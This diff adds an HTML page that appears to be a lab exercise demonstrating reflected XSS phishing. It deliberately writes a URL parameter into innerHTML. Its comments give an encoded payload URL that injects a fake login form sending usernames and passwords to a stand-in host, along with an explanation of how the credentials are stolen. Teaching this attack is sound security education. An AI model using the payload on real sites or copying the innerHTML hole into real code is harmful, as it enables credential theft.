@@ -1,0 +1,39 @@
+<html>
+    <body>
+        <div>
+            <!-- Vulnerable code -->
+            Welcome, <span id="username"></span> 
+
+           
+        </div>
+        <script>
+            function setCookie(name, value, days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days*24*60*60) );
+                const expires = "expires="+date.toUTCString();
+                document.cookie = name + "=" + value + ";" + expires; 
+                console.log(document.cookie)
+            }
+            setCookie("exampleCookie", "Hello cookie", 4);
+
+            const params = new URLSearchParams(window.location.search)
+            const name = params.get('name')
+            document.getElementById('username').innerHTML = name;
+            // use text content to avoid XSS atttack
+           // document.getElementById('username').innerHTML = name;
+
+        </script>
+    </body>
+</html>
+
+<!--encodeURIComponent(`<form action="http://example.com/fakepage.php">
+                username:<input name="username"/>
+                password:<input type="password" name="password"/>
+                <input type="submit" value="Logon"/>
+            </form>`)-->
+
+<!-- http://127.0.0.1:5500/security/xss/ex5-phishing-attack.html?name=%3Cform%20action%3D%22http%3A%2F%2Fexample.com%2Ffakepage.php%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20username%3A%3Cinput%20name%3D%22username%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%3Cinput%20type%3D%22password%22%20name%3D%22password%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20value%3D%22Logon%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E -->
+
+<!--users are prompted with fake new page with username and password(back login form) 
+    on click on logon username and password is passed to new fake page thus your credentials
+     are stolen-->
